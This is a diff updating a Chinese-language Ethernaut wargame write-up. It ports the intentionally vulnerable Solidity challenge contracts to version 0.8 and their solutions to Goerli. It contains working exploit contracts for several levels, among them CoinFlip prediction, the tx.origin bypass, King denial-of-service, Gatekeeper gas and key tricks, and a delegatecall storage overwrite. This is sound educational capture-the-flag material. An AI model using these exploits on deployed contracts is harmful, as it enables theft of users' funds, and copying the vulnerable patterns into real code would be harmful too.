@@ -69,17 +69,16 @@ tags:
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
-import '@openzeppelin/contracts/math/SafeMath.sol';
-
+// Arithmetic operations revert on underflow and overflow
+// no need to use SafeMath after v0.8.0
 contract Fallback {
 
-  using SafeMath for uint256;
   mapping(address => uint) public contributions;
-  address payable public owner;
+  address public owner;
 
-  constructor() public {  // 构造函数
+  constructor() { // 构造函数
     owner = msg.sender; // 所有者为当前调用
     contributions[msg.sender] = 1000 * (1 ether);
   }
@@ -108,7 +107,7 @@ contract Fallback {
   }
 
   function withdraw() public onlyOwner {
-    owner.transfer(address(this).balance);  // 合约所有者才能将账户余额清零
+    payable(owner).transfer(address(this).balance); // 合约所有者才能将账户余额清零
   }
 
   // 一个合约最多能有一个 receive 函数，不能有参数和返回值
@@ -217,31 +216,28 @@ contract Fallout {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
-
-import '@openzeppelin/contracts/math/SafeMath.sol';
+pragma solidity ^0.8.0;
 
 contract CoinFlip {
 
-  using SafeMath for uint256;
   uint256 public consecutiveWins;
   uint256 lastHash;
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-  constructor() public {
+  constructor() {
     consecutiveWins = 0;
   }
 
   function flip(bool _guess) public returns (bool) {
     // block.number - 当前区块号
-    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+    uint256 blockValue = uint256(blockhash(block.number - 1));
 
     if (lastHash == blockValue) {
       revert(); // 无条件抛出异常
     }
 
     lastHash = blockValue;
-    uint256 coinFlip = blockValue.div(FACTOR);  // 向下取整
+    uint256 coinFlip = blockValue / FACTOR;  // 向下取整
     bool side = coinFlip == 1 ? true : false;
 
     if (side == _guess) {
@@ -262,12 +258,9 @@ contract CoinFlip {
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import '@openzeppelin/contracts/utils/math/SafeMath.sol';
-
 // 把需要调用的合约放在同一个文件
 contract CoinFlip {
 
-  using SafeMath for uint256;
   uint256 public consecutiveWins;
   uint256 lastHash;
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
@@ -277,7 +270,7 @@ contract CoinFlip {
   }
 
   function flip(bool _guess) public returns (bool) {
-    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+    uint256 blockValue = uint256(blockhash(block.number - 1));
 
     // 当前区块号不能等于上一区块号，意味着不能使用循环重复调用 flip
     if (lastHash == blockValue) {
@@ -285,7 +278,7 @@ contract CoinFlip {
     }
 
     lastHash = blockValue;
-    uint256 coinFlip = blockValue.div(FACTOR);
+    uint256 coinFlip = blockValue / FACTOR;
     bool side = coinFlip == 1 ? true : false;
 
     if (side == _guess) {
@@ -299,7 +292,6 @@ contract CoinFlip {
 }
 
 contract hack {
-    using SafeMath for uint256;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
     CoinFlip coin;
 
@@ -308,8 +300,8 @@ contract hack {
     }
 
     function exploit() public {
-        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-        uint256 coinFlip = blockValue.div(FACTOR);
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
         coin.flip(side);
     }
@@ -336,7 +328,7 @@ contract hack {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract Telephone {
 
@@ -362,13 +354,13 @@ contract Telephone {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract Telephone {
 
   address public owner;
 
-  constructor() public {
+  constructor() {
     owner = msg.sender;
   }
 
@@ -381,16 +373,14 @@ contract Telephone {
 
 contract Hack {
 
-  address public owner;
   Telephone tele;
 
-  constructor(address instance) public {
-    owner = msg.sender;
+  constructor(address instance) {
     tele = Telephone(instance);
   }
 
   function exploit() public {
-    tele.changeOwner(owner);
+    tele.changeOwner(msg.sender);
   }
 }
 ```
@@ -441,13 +431,13 @@ contract Token {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract Delegate {
 
   address public owner;
 
-  constructor(address _owner) public {
+  constructor(address _owner) {
     owner = _owner;
   }
 
@@ -461,7 +451,7 @@ contract Delegation {
   address public owner;
   Delegate delegate;
 
-  constructor(address _delegateAddress) public {
+  constructor(address _delegateAddress) {
     delegate = Delegate(_delegateAddress);
     owner = msg.sender;
   }
@@ -501,7 +491,7 @@ contract Delegation {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract Force {/*
 
@@ -519,7 +509,7 @@ contract Force {/*
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract Hack {
 
@@ -551,13 +541,13 @@ contract Hack {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract Vault {
   bool public locked;
   bytes32 private password;
 
-  constructor(bytes32 _password) public {
+  constructor(bytes32 _password) {
     locked = true;
     password = _password;
   }
@@ -596,15 +586,15 @@ contract Vault {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract King {
 
-  address payable king;
+  address king;
   uint public prize;
-  address payable public owner;
+  address public owner;
 
-  constructor() public payable {
+  constructor() payable {
     owner = msg.sender;  
     king = msg.sender;
     prize = msg.value;
@@ -614,12 +604,12 @@ contract King {
     // 即使转账金额小于 prize，合约的所有者也可以声明国王身份
     require(msg.value >= prize || msg.sender == owner);
     // 当前的转账金额会转给上一任国王
-    king.transfer(msg.value);
+    payable(king).transfer(msg.value);
     king = msg.sender;
     prize = msg.value;  // 更新 prize
   }
 
-  function _king() public view returns (address payable) {
+  function _king() public view returns (address) {
     return king;
   }
 }
@@ -629,22 +619,22 @@ contract King {
 - 查看当前最高金额
 
     ```js
-    >> web3.utils.fromWei(await contract.prize())
-    "0.001"
+    >> web3.utils.toWei(web3.utils.fromWei(await contract.prize()))
+    "1000000000000000"
     ```
 
 - 新建合约，用于声明国王身份，并阻止关卡实例再成为国王
 
     ```js
     // SPDX-License-Identifier: MIT
-    pragma solidity ^0.6.0;
+    pragma solidity ^0.8.0;
 
     contract Hack {
 
-      constructor() public payable {}
+      constructor() payable {}
 
-      function exploit(address payable instance) public {
-        instance.call{value: 0.001 * (1 ether)}("");  // 汽油费一定要给足！
+      function exploit(address instance) public {
+        payable(instance).call{value: 0.001 * (1 ether)}("");  // 汽油量一定要给足！
         // 不能使用 transfer/send，默认 2300 汽油费不足以支撑后续操作
       }
 
@@ -661,7 +651,7 @@ contract King {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.6.12;
 
 import '@openzeppelin/contracts/math/SafeMath.sol';
 
@@ -705,7 +695,7 @@ contract Reentrance {
 
     ```js
     // SPDX-License-Identifier: MIT
-    pragma solidity ^0.6.0;
+    pragma solidity ^0.6.12;
 
     import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';
 
@@ -764,6 +754,7 @@ contract Reentrance {
 - 随后开始「盗钱」，务必给足汽油 :)
     > 本次汽油量参考：200,000 | 156,169 (78.08%)
 
+- 不推荐使用 `transfer` 和 `send` 来代替 `call`，可能影响 Istanbul 硬分叉之后的合约（部分指令消耗汽油量增加）
 - 永远假设转账的接收方是另一个合约，而非普通的地址
 
 ## 11. Elevator
@@ -772,7 +763,7 @@ contract Reentrance {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 interface Building {
   function isLastFloor(uint) external returns (bool);
@@ -798,7 +789,7 @@ contract Elevator {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract Building {
   bool public flag = true;
@@ -843,7 +834,7 @@ contract Elevator {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract Privacy {
   // slot 0
@@ -860,7 +851,7 @@ contract Privacy {
   // slot 3, 4, 5
   bytes32[3] private data;
 
-  constructor(bytes32[3] memory _data) public {
+  constructor(bytes32[3] memory _data) {
     data = _data;
   }
   
@@ -916,13 +907,10 @@ contract Privacy {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
-
-import '@openzeppelin/contracts/math/SafeMath.sol';
+pragma solidity ^0.8.0;
 
 contract GatekeeperOne {
 
-  using SafeMath for uint256;
   address public entrant;
 
   modifier gateOne() {
@@ -931,7 +919,7 @@ contract GatekeeperOne {
   }
 
   modifier gateTwo() {
-    require(gasleft().mod(8191) == 0);
+    require(gasleft() % 8191 == 0);
     _;
   }
 
@@ -942,7 +930,7 @@ contract GatekeeperOne {
       // _gateKey % 2^32 != _gateKey
       require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
       // _gateKey % 2^32 == tx.origin % 2^16
-      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
+      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
     _;
   }
 
@@ -957,10 +945,13 @@ contract GatekeeperOne {
 - 至于 `gateTwo`，在 Remix 的 JavaScript VM 环境下通过 Debug 来获取具体所需汽油量
     - **注意**：不同版本的 EVM 或编译器都会导致不同的汽油消耗量
     - 首先选择一个较大的汽油量，如 `90000`
-    - 执行完成后，进入 `DEBUGGER`，执行到 `mod` 这一步，此时可查看参与模运算两个局部变量的值，其中 `a` 就对应了当前剩余的汽油量，为 `89746`<br>
-![89746](img/ethernaut04.jpg)
+    - 执行完成后，进入 `DEBUGGER`，执行完操作码 `GAS`，此时剩余的汽油量为 `89577`<br>
+![89577](img/ethernaut04.jpg)
 
-    - 由此可计算出通过 `gateTwo` 实际需要的最少汽油量：$90000-89746+8191=8445$
+    - 由此可计算出通过 `gateTwo` 实际需要的最少汽油量：$90000-89577+8191\times 3=24996$
+        - `entrant = tx.origin` 包含 `SSTORE` 操作码，因为 `entrant` 未被写入过，至少需要消耗 20000 汽油
+    - 在 Goerli 测试网络中运行时会抛出异常，再次调试，观察栈中出现 `0x1fff(8191)` 的下一个数字，为 `0x60a4(24740)`，得出最终需要的汽油量为：$24996-24740+8191\times 3=24829$
+![0x60a4](img/ethernaut05.jpg)
 
 - 对于 `gateThree`，用 $A_0A_1...A_7$ 来表示 `_gateKey` 的各个字节
     - `part one` 需满足 $A_4A_5A_6A_7 = A_6A_7$
@@ -970,13 +961,10 @@ contract GatekeeperOne {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
-
-import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';
+pragma solidity ^0.8.0;
 
 contract GatekeeperOne {
 
-  using SafeMath for uint256;
   address public entrant;
 
   modifier gateOne() {
@@ -985,14 +973,14 @@ contract GatekeeperOne {
   }
 
   modifier gateTwo() {
-    require(gasleft().mod(8191) == 0);
+    require(gasleft() % 8191 == 0);
     _;
   }
 
   modifier gateThree(bytes8 _gateKey) {
       require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
       require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
-      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
+      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
     _;
   }
 
@@ -1005,8 +993,8 @@ contract GatekeeperOne {
 contract Hack {
   function exploit(address instance) public {
     GatekeeperOne gk = GatekeeperOne(instance);
-    bytes8 _gateKey = bytes8(uint64(msg.sender) & 0xff0000ffff);
-    gk.enter{gas: 8445}(_gateKey);
+    bytes8 _gateKey = bytes8(uint64(uint160(tx.origin)) & 0xff0000ffff);
+    gk.enter{gas: 24829}(_gateKey);
   }
 }
 ```
@@ -1015,6 +1003,7 @@ contract Hack {
 
 - [Solidity variables — storage, type conversions and accessing private variables](https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183)
 - [solidity - Why does Remix's jsVM show incorrect gas? - Ethereum Stack Exchange](https://ethereum.stackexchange.com/questions/84670/why-does-remixs-jsvm-show-incorrect-gas)
+- [Opcodes for the EVM | ethereum.org](https://ethereum.org/en/developers/docs/evm/opcodes/)
 
 ## 14. Gatekeeper Two
 
@@ -1022,7 +1011,7 @@ contract Hack {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract GatekeeperTwo {
 
@@ -1043,7 +1032,7 @@ contract GatekeeperTwo {
   }
 
   modifier gateThree(bytes8 _gateKey) {
-    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
+    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
     _;
   }
 
@@ -1059,7 +1048,7 @@ contract GatekeeperTwo {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract GatekeeperTwo {
 
@@ -1078,7 +1067,7 @@ contract GatekeeperTwo {
   }
 
   modifier gateThree(bytes8 _gateKey) {
-    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
+    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
     _;
   }
 
@@ -1090,9 +1079,9 @@ contract GatekeeperTwo {
 
 contract Hack {
 
-  constructor(address instance) public {
+  constructor(address instance) {
     GatekeeperTwo gk = GatekeeperTwo(instance);
-    gk.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)));
+    gk.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max)));
   }
 }
 ```
@@ -1107,7 +1096,7 @@ contract Hack {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
 
@@ -1116,13 +1105,12 @@ contract NaughtCoin is ERC20 { // 基于 ERC20
   // string public constant name = 'NaughtCoin';
   // string public constant symbol = '0x0';
   // uint public constant decimals = 18;
-  uint public timeLock = now + 10 * 365 days;
+  uint public timeLock = block.timestamp + 10 * 365 days;
   uint256 public INITIAL_SUPPLY;
   address public player;
 
   constructor(address _player) 
-  ERC20('NaughtCoin', '0x0')
-  public {
+  ERC20('NaughtCoin', '0x0') {
     player = _player;
     INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
     // _totalSupply = INITIAL_SUPPLY;
@@ -1139,12 +1127,12 @@ contract NaughtCoin is ERC20 { // 基于 ERC20
   // Prevent the initial owner from transferring tokens until the timelock has passed
   modifier lockTokens() {
     if (msg.sender == player) {
-      require(now > timeLock);
+      require(block.timestamp > timeLock);
       _;
     } else {
      _;
     }
-  } 
+  }
 } 
 ```
 
@@ -1177,7 +1165,7 @@ contract NaughtCoin is ERC20 { // 基于 ERC20
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract Preservation {
 
@@ -1189,7 +1177,7 @@ contract Preservation {
   // Sets the function signature for delegatecall
   bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
 
-  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
+  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
     timeZone1Library = _timeZone1LibraryAddress; 
     timeZone2Library = _timeZone2LibraryAddress; 
     owner = msg.sender;
@@ -1224,7 +1212,7 @@ contract LibraryContract {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract Preservation {
 
@@ -1234,7 +1222,7 @@ contract Preservation {
   uint storedTime;
   bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
 
-  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
+  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
     timeZone1Library = _timeZone1LibraryAddress; 
     timeZone2Library = _timeZone2LibraryAddress; 
     owner = msg.sender;
@@ -1268,7 +1256,7 @@ contract Hack {
 
   Preservation preservation;
 
-  constructor(address instance) public {
+  constructor(address instance) {
       preservation = Preservation(instance);
   }
 
@@ -1280,9 +1268,9 @@ contract Hack {
   }
 
   // function signature must match LibraryContract.setTimeSignature
-  function setTime(uint _) public {
+  function setTime(uint _time) public {
       owner = tx.origin;
-      _;
+      _time;
   }
 }
 ```
@@ -1301,9 +1289,7 @@ contract Hack {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
-
-import '@openzeppelin/contracts/math/SafeMath.sol';
+pragma solidity ^0.8.0;
 
 contract Recovery {
 
@@ -1311,30 +1297,29 @@ contract Recovery {
   function generateToken(string memory _name, uint256 _initialSupply) public {
     new SimpleToken(_name, msg.sender, _initialSupply);
   }
+
 }
 
 contract SimpleToken {
 
-  using SafeMath for uint256;
-  // public variables
   string public name;
   mapping (address => uint) public balances;
 
   // constructor
-  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
+  constructor(string memory _name, address _creator, uint256 _initialSupply) {
     name = _name;
     balances[_creator] = _initialSupply;
   }
 
   // collect ether in return for tokens
   receive() external payable {
-    balances[msg.sender] = msg.value.mul(10);
+    balances[msg.sender] = msg.value * 10;
   }
 
   // allow transfers of tokens
   function transfer(address _to, uint _amount) public { 
     require(balances[msg.sender] >= _amount);
-    balances[msg.sender] = balances[msg.sender].sub(_amount);
+    balances[msg.sender] = balances[msg.sender] - _amount;
     balances[_to] = _amount;
   }
 
@@ -1346,10 +1331,10 @@ contract SimpleToken {
 ```
 
 - 已知合约 `Recovery` 的地址，需要恢复其中创建的合约 `SimpleToken` 里的以太，但合约 `SimpleToken` 创建后没有赋值给变量
-- 不过信息都是公开的嘛！使用合约 `Recovery` 的地址在 [Etherscan](https://rinkeby.etherscan.io/address/0x16E277D062Decea0879110009CFB4C020491B1a7#internaltx) 找到交易信息，其中就包括合约创建 ΦωΦ 合约 `SimpleToken` 实例的地址 GET ✔️ <br>
-![Contract Creation](img/ethernaut05.jpg)
+- 不过信息都是公开的嘛！使用合约 `Recovery` 的地址在 [Etherscan](https://goerli.etherscan.io/address/0x518c2143bdd79d3bc060bc4883d92d545d3e3bb0#internaltx) 找到交易信息，其中就包括合约创建 ΦωΦ 合约 `SimpleToken` 实例的地址 GET ✔️ <br>
+![Contract Creation](img/ethernaut06.jpg)
 - 在 Remix 添加合约 `SimpleToken` 的源码，通过 `At Address` 引用合约<br>
-![At Address](img/ethernaut06.jpg)
+![At Address](img/ethernaut07.jpg)
 - 接下来调用 `destroy` 函数就可以取回以太啦 XD
 - 实际上，合约地址都是确定性的，通过合约创建者（`sender`）的地址 `address` 以及由创建者发起的交易的数量 `nonce` 计算获得
     - 根据 [EIP 161](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-161.md#specification)，初始 `nonce` 为 $1$
@@ -1366,8 +1351,8 @@ contract SimpleToken {
       address_bytes = keccak(rlp.encode([sender_bytes, nonce]))[12:]
       return to_checksum_address(address_bytes)
 
-    mk_contract_address(to_checksum_address("0x16E277D062Decea0879110009CFB4C020491B1a7"), 1)
-    # 0x935eC7Ae1497f5361d69AD99EB5b6577Deeb0D4F
+    mk_contract_address(to_checksum_address("0x518C2143bDd79d3bc060BC4883d92D545D3E3bb0"), 1)
+    # 0x53D144BcF44de3DeE630b1CFEabD91AC3d3caF5a
     ```
 
 - 因此，可以将以太币发送到预确定的地址，随后在指定地址创建合约来恢复以太币，实现无私钥保存以太币
@@ -1384,13 +1369,13 @@ contract SimpleToken {
 
 ```js
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract MagicNum {
 
   address public solver;
 
-  constructor() public {}
+  constructor() {}
 
   function setSolver(address _solver) public {
     solver = _solver;
@@ -1435,16 +1420,16 @@ contract MagicNum {
 
     ```js
     >> let bytecode = "600a600c600039600a6000f3602a60005260206000f3";
-    >> web3.eth.sendTransaction({"data": bytecode, "from": player})
+    >> await web3.eth.sendTransaction({"data": bytecode, "from": player})
+    Object { blockHash: "0x91be4e10a259695dc64e5feea7b875135dfc3f96f1b649554761514f4282c815", blockNumber: 8034615, contractAddress: "0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736", ... }
     ```
 
-- [Rinkeby Transaction Hash (Txhash) Details](https://rinkeby.etherscan.io/tx/0x95938e4aabc67cd95dd9d4049b57a25baa79db0381dad25cee561e875a33286b) 查询创建合约的地址
 - 接下来调用实例的 `setSolver` 就好啦 =v=
 
     ```js
-    >> await contract.setSolver("0x55f81c329b419adb95a16a014473e86c487ea56d");
+    >> await contract.setSolver("0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736");
     >> await contract.solver();
-    "0x55F81C329b419Adb95a16A014473e86C487eA56d"
+    "0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736"
     ```
 
 ### 参考资料
